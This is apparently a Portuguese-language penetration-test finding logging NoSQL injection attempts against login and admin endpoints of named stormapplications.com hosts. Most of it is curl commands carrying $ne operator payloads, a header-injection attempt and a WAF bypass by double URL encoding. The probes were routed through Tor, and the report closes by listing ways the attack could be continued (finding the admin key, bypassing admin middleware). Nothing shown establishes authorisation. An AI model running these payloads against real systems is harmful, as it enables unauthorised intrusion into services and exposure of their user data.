# F-011 NoSQL Injection Testing — Login Endpoints
Alvo: mng.stormapplications.com, api-beta.stormapplications.com (/api/login, /admin/login)
Severidade: Média (não confirmada, vetor potencial)
Timestamp: 2026-08-23T05:15:00Z

## Técnicas testadas

### 1. POST JSON NoSQLi — /api/login
Comandos executados (via proxychains4 Tor):
```bash
# $ne (not equal)
curl -sk -X POST "https://mng.stormapplications.com/api/login" \
  -H "Authorization: Bearer test" \
  -H "Content-Type: application/json" \
  -d '{"username":{"$ne":""},"password":{"$ne":""}}'

# $gt, $regex, $exists, $where, $or, $nin — todas variações
```

Response padronizada: `{"code":"NOT_FOUND"}` (HTTP 404) para TODOS os payloads.
Conclusão: POST /api/login não processa credenciais — é o callback OAuth (só GET).

### 2. POST JSON NoSQLi com x-storm-admin-key
```bash
curl -sk -X POST "https://mng.stormapplications.com/api/login" \
  -H "x-storm-admin-key: test" \
  -H "Content-Type: application/json" \
  -d '{"username":{"$ne":""},"password":{"$ne":""}}'
```
Response: `{"code":"FORBIDDEN"}` (HTTP 403) — header reconhecido, key inválida.

### 3. POST /admin/login
```bash
curl -sk -X POST "https://api-beta.stormapplications.com/admin/login" \
  -H "Content-Type: application/json" \
  -d '{"username":{"$ne":""},"password":{"$ne":""}}'
```
Response: `{"code":"ADMIN_AUTH_REQUIRED"}` (HTTP 403) — middleware de admin bloqueia antes do handler de login.

### 4. GET URL-encoded NoSQLi
```bash
curl "https://mng.stormapplications.com/api/login?username[\$ne]=&password[\$ne]="
```
Resultado: Conexão dropada (Cloudflare WAF bloqueando queries com `$ne` na URL).
Double URL encoding bypassou WAF, mas parâmetros não são usados em queries MongoDB.

### 5. GET /api/login com state
```bash
curl "https://mng.stormapplications.com/api/login?state=123456789%20guild_test"
```
Response: 302 redirect → `stormapplications.com/auth/verify/done?status=error&bot=123456789&guild=...`
State format: `<bot_id> <guild_id>` — server-side split por espaço.

### 6. NoSQLi via Header
```bash
curl -sk -X POST "https://api-beta.stormapplications.com/admin/login" \
  -H "x-storm-admin-key[$\$ne]: test" \
  -d '{"username":"admin","password":"admin"}'
```
Response: HTTP 000 (conexão fechada — header malformado/rejeitado)

### 7. api-beta /status — Info Disclosure
```bash
curl "https://api-beta.stormapplications.com/status"
```
Response: JSON completo com 28666 users, 644 apps, bot IDs, pricing, redirect_uri.

## Interpretação
- **POST /api/login não é endpoint de login tradicional** — é OAuth callback handler.
- **NoSQLi não confirmado** — nenhum payload alterou a resposta.
- **Vetor existe em /admin/login** mas bloqueado por middleware de admin auth.
- **Chave x-storm-admin-key** é reconhecida pelo backend (muda response de 404→403) mas valor correto é desconhecido.

## Impacto
Sem confirmação de NoSQLi no momento. O vetor persiste se:
1. A chave `x-storm-admin-key` correta for obtida
2. Um bypass do middleware ADMIN_AUTH_REQUIRED for encontrado
